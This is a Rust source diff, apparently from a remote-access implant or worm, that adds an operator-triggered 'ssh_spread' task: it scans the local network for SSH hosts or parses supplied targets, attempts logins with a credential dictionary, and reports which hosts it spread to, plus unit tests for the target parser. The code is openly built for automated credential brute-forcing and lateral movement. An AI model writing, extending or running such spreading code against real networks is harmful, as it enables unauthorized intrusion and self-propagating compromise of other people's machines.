@@ -3,9 +3,12 @@ use std::net::TcpStream;
 use std::sync::Mutex;
 use anyhow::anyhow;
 use ssh2::Session;
-use crate::tasks::NetworkHost;
+use crate::tasks::{NetworkHost, Port, RunningTasks, scan_local_net};
 use rayon::prelude::*;
+use crate::models::TaskResult;
+use crate::tasks::network_scan::{network_scan, parse_ports};
 
+pub const SSH_PORT: u16 = 22;
 const SSH_CONNECT_TIMEOUT: u32 = 5000;
 const SPREAD_THREADS: usize = 6;
 static OS_ID_COMMAND: &'static str = "uname -a";
@@ -150,7 +153,7 @@ fn try_ssh_spread(host: &String, username: &String, password: &String) -> Option
 ///
 /// # Errors
 /// If fails to create the thread pool
-fn ssh_spread(hosts: Vec<NetworkHost>) -> Result<Vec<String>, anyhow::Error> {
+fn run_ssh_spread(hosts: Vec<NetworkHost>) -> Result<Vec<String>, anyhow::Error> {
     #[cfg(debug_assertions)]
     println!("Trying to spread to hosts: {:?}", hosts);
 
@@ -186,3 +189,186 @@ fn ssh_spread(hosts: Vec<NetworkHost>) -> Result<Vec<String>, anyhow::Error> {
     Ok(res)
 }
 
+/// Parses the hosts from a target hosts string
+/// Hosts are separated with ';', and target ports are specified with ':'
+///
+/// # Example
+/// Parsed hosts are defined as [(IP, PORTS)]
+/// "1.2.3.4:21-23" => [(1.2.3.4, 21,22,23)]
+/// "1.2.3.4:21-23; 4.3.2.1" =>  [(1.2.3.4, 21,22,23), (4.3.2.1, 22)]
+/// "1.2.3.4:21,22,23; 4.3.2.1:" =>  [(1.2.3.4, 21,22,23), (4.3.2.1, 22)]
+///
+/// # Returns
+/// Vector of NetworkHosts containing the parsed hosts with ports
+fn parse_target_hosts(data: String) -> Vec<NetworkHost> {
+    let mut hosts: Vec<NetworkHost> = Vec::new();
+    for h in data.split(';').collect::<Vec<&str>>() {
+        if h.contains(':') {
+            // Ports are defined, also needs to parse ports
+            let h_split = h.split(':').collect::<Vec<&str>>();
+            let mut ports = parse_ports(h_split[1].to_string())
+                .into_iter()
+                .map(|p| {
+                    Port {
+                        port: p,
+                        is_open: true,
+                    }
+                }).collect::<Vec<Port>>();
+            // Ports are parsed, add to hosts
+            hosts.push(NetworkHost {
+                ip: h_split[0].trim().to_string(),
+                open_ports: if ports.is_empty() {
+                    [Port { port: SSH_PORT, is_open: true }].to_vec()
+                } else {
+                    ports
+                },
+            })
+        } else if h.trim() != "" {
+            // No ports are defined, add default port
+            hosts.push(NetworkHost {
+                ip: h.trim().to_string(),
+                open_ports: vec![Port { port: SSH_PORT, is_open: true }],
+            })
+        }
+    }
+    hosts
+}
+
+/// Tries to spread to other hosts on the local net by using SSH and a dictionary with credentials
+/// Intended to be run on another thread than the main thread, puts the resulting data in
+/// RUNNING_TASKS
+pub fn ssh_spread(running_tasks: &Mutex<RunningTasks>, task_id: String, host_string: String) {
+    let mut hosts = Vec::new();
+    if !host_string.is_empty() {
+        // Uses hosts defined in
+        hosts = parse_target_hosts(host_string);
+    } else {
+        // No hosts are defined, will try all on the local network
+        let ports = [SSH_PORT].to_vec();
+        hosts = match scan_local_net(ports) {
+            Ok(val) => val,
+            Err(e) => {
+                let res = format!("Failed to get hosts when scanning the local network: {}",
+                                  e);
+                #[cfg(debug_assertions)]
+                println!("{}", res);
+                running_tasks.lock().unwrap().add_task_result(TaskResult {
+                    id: task_id,
+                    status: 1,
+                    result: res,
+                });
+                return;
+            }
+        };
+    }
+
+    if hosts.is_empty() {
+        let res = "No host detected, nothing to spread to";
+        #[cfg(debug_assertions)]
+        println!("{}", res);
+        running_tasks.lock().unwrap().add_task_result(TaskResult {
+            id: task_id,
+            status: 1,
+            result: res.to_string(),
+        });
+        return;
+    }
+
+    let spread_to = match run_ssh_spread(hosts) {
+        Ok(val) => val,
+        Err(e) => {
+            let res = format!("Failed to spread to hosts: {}", e);
+            #[cfg(debug_assertions)]
+            println!("{}", res);
+            running_tasks.lock().unwrap().add_task_result(TaskResult {
+                id: task_id,
+                status: 1,
+                result: res.to_string(),
+            });
+            return;
+        }
+    };
+
+    let mut res = "SSH spread results:\n".to_string();
+    res.push_str(&*spread_to.join("\n"));
+    let task_result = TaskResult {
+        id: task_id,
+        status: 0,
+        result: res,
+    };
+
+    running_tasks.lock().unwrap().add_task_result(task_result);
+}
+
+#[cfg(test)]
+mod tests {
+    use crate::tasks::Port;
+    use super::*;
+
+    fn test_hosts(hosts: Vec<NetworkHost>, expected: Vec<NetworkHost>) {
+        for i in 0..expected.len() {
+            assert_eq!(hosts[i].to_string(), expected[i].to_string());
+        }
+    }
+
+    const HOST_STRING: &'static str = "192.168.1.1:22,23,24; 192.168.1.2:21-23,24;";
+
+    #[test]
+    fn test_parse_target_host() {
+        let expected_hosts: [NetworkHost; 2] = [
+            NetworkHost {
+                ip: "192.168.1.1".to_string(),
+                open_ports: vec![Port { port: 22, is_open: true },
+                                 Port { port: 23, is_open: true },
+                                 Port { port: 24, is_open: true }],
+            },
+            NetworkHost {
+                ip: "192.168.1.2".to_string(),
+                open_ports: vec![Port { port: 21, is_open: true },
+                                 Port { port: 22, is_open: true },
+                                 Port { port: 23, is_open: true },
+                                 Port { port: 24, is_open: true }],
+            }
+        ];
+        test_hosts(expected_hosts.to_vec(),
+                   parse_target_hosts(HOST_STRING.to_string()));
+    }
+
+    const HOST_STRING1: &'static str = "192.168.1.1:22,23,65536; 192.168.1.2:; 192.168.1.3";
+
+    #[test]
+    fn test_parse_target_host_invalid_ports() {
+        let expected_hosts: [NetworkHost; 3] = [
+            NetworkHost {
+                ip: "192.168.1.1".to_string(),
+                open_ports: vec![Port { port: 22, is_open: true },
+                                 Port { port: 23, is_open: true }],
+            },
+            NetworkHost {
+                ip: "192.168.1.2".to_string(),
+                open_ports: vec![Port { port: SSH_PORT, is_open: true }],
+            },
+            NetworkHost {
+                ip: "192.168.1.3".to_string(),
+                open_ports: vec![Port { port: SSH_PORT, is_open: true }],
+            }
+        ];
+        test_hosts(parse_target_hosts(HOST_STRING1.to_string()),
+                   expected_hosts.to_vec());
+    }
+
+    const HOST_STRING2: &'static str = "192.168.1.1:22-24";
+
+    #[test]
+    fn test_parse_target_single_host() {
+        let expected_hosts: [NetworkHost; 1] = [
+            NetworkHost {
+                ip: "192.168.1.1".to_string(),
+                open_ports: vec![Port { port: 22, is_open: true },
+                                 Port { port: 23, is_open: true },
+                                 Port { port: 24, is_open: true }],
+            }];
+        test_hosts(expected_hosts.to_vec(),
+                   parse_target_hosts(HOST_STRING2.to_string()));
+    }
+}
